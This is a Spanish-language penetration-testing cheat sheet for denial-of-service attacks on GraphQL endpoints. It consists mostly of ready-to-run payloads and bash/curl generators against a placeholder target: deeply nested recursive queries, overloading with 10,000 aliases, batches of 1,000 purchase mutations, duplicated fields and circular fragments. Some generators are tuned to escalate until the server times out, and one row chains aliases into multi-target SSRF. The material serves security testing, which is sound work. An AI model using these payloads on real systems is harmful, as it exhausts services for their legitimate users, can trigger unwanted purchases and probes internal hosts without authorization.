---
aliases:
  - GraphQL DoS
  - Nested Query DoS
  - Aliases Overload
  - Circular Fragments
tags:
  - vuln/graphql
  - vuln/dos
  - technique/impact
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[GraphQL Injection]]"
---
# GraphQL - DoS

> [!tip] Comando base
> Los payloads `{"query":...}` se lanzan con:
> `curl -sX POST -H 'Content-Type: application/json' -d '<BODY>' https://target/graphql`
> Las filas con `sqlmap`, `curl`, `echo` o loops bash son comandos completos ejecutables tal cual.

---

## Deeply Nested Queries (Recursión)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{"query":"{user{posts{author{posts{author{posts{author{id}}}}}}}}"}` | 6 niveles de recursión | Type cycle User↔Post. |
| `{"query":"{user{friends{friends{friends{friends{friends{name}}}}}}}"}` | Friend-of-friend explosion | Self-referencing relations. |
| `{"query":"{users(first:1000){posts(first:1000){comments(first:1000){body}}}}"}` | N³ resolves (10⁹ ops) | Pagination sin limit. |
| `{"query":"{me{manager{manager{manager{manager{name}}}}}}"}` | Self-ref recursion | Type con field a sí mismo. |
| `time curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{me{friends{friends{friends{friends{name}}}}}}"}' https://target/graphql` | Mide latencia → confirma DoS | Pre-attack check. |

Para profundidad arbitraria (auto-tune): ver **Generador nested query (bash)** abajo.
^graphql-dos-nested

### Generador nested query (bash)

```bash
# Genera query con N niveles de nested User→friends
N=15
QUERY="{me"
for i in $(seq 1 $N); do QUERY+="{friends"; done
QUERY+="{name}"
for i in $(seq 1 $N); do QUERY+="}"; done
QUERY+="}"

curl -X POST -H "Content-Type: application/json" \
  -d "{\"query\":\"$QUERY\"}" \
  https://target/graphql
```

---

## Aliases Overloading

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{"query":"{a1:expensiveQuery(id:1){result} a2:expensiveQuery(id:2){result}}"}` | 2+ resolves single query | Aliases sin limit. |
| `{"query":"{a:fetch(url:\"http://t1\") b:fetch(url:\"http://t2\") c:fetch(url:\"http://t3\")}"}` | Multi-target SSRF en 1 request | Combine con SSRF resolver. |
| `{"query":"mutation{a:expensiveMutation b:expensiveMutation c:expensiveMutation}"}` | Aliased mutations en paralelo | Race conditions + DoS. |

Para 10000 aliases sobre un resolver caro (DB pool exhaustion): ver **Generador aliases overload (bash)** abajo. Combo con login brute: ver [[GraphQL - Auth y Logica]].
^graphql-dos-aliases

### Generador aliases overload (bash)

```bash
# 10000 aliases sobre resolver expensive
QUERY='{'
for i in $(seq 1 10000); do
  QUERY+="a${i}:expensiveQuery(id:${i}){result} "
done
QUERY+='}'

curl -X POST -H "Content-Type: application/json" \
  -d "{\"query\":\"$QUERY\"}" \
  https://target/graphql

# Ajustar N: empezar 100, 1000, 10000 hasta que server timeout
```

---

## Field Duplication / Batching Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{"query":"{user{id id id id id id id id id id}}"}` | Engine no deduplica → N resolves del mismo field | Engine viejo. |
| `[{"query":"{expensiveQuery{result}}"},{"query":"{expensiveQuery{result}}"}]` (×1000) | Single request → N ejecuciones de query pesada | Spec batching habilitado. |
| `[{"query":"{__schema{types{name}}}"},{"query":"{__schema{types{name}}}"}]` (×100) | Heavy introspection compute repetido | Introspection no deshabilitada. |
| `[{"query":"mutation{purchase(id:1)}"},{"query":"mutation{purchase(id:1)}"}]` (×N) | Race conditions + DoS combo | Mutations idempotentes pero costosas. |
| `{"query":"{usrA usrB usrC ... usr10000}"}` con 10k field nonexistent | Suggestions engine sobrecarga | "Did you mean" enabled. |
^graphql-dos-batching

### Batched mutations DoS

```bash
# 1000 mutations idénticas en single request
BATCH='['
for i in $(seq 1 1000); do
  BATCH+="{\"query\":\"mutation{purchase(productId:1,quantity:1){id}}\"}"
  [ $i -lt 1000 ] && BATCH+=','
done
BATCH+=']'

curl -X POST -H "Content-Type: application/json" -d "$BATCH" https://target/graphql
```

---

## Circular Fragments

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{"query":"query{user{...A}} fragment A on User{...B} fragment B on User{...A}"}` | Direct fragment cycle → engine loop | Engine viejo no detecta cycles. |
| `{"query":"... fragment A on User{...B} fragment B on User{...C} fragment C on User{...A}"}` | 3-way cycle indirect | Detección menos común. |
| `{"query":"{user{... on User{... on User{... on User{name}}}}}"}` | Inline fragment self-loop | Edge case algunos engines. |
| `curl -w "@curl-format.txt" ...` | Mide tiempo de response | Confirma engine vulnerable. |
^graphql-dos-circular

### PoC circular fragments

```graphql
query Cycle {
  user {
    ...A
  }
}

fragment A on User {
  ...B
}

fragment B on User {
  ...A
}
```

Engine viejo intenta expandir A → expand B → expand A → loop. Apps modernas detectan y rejectan.

---
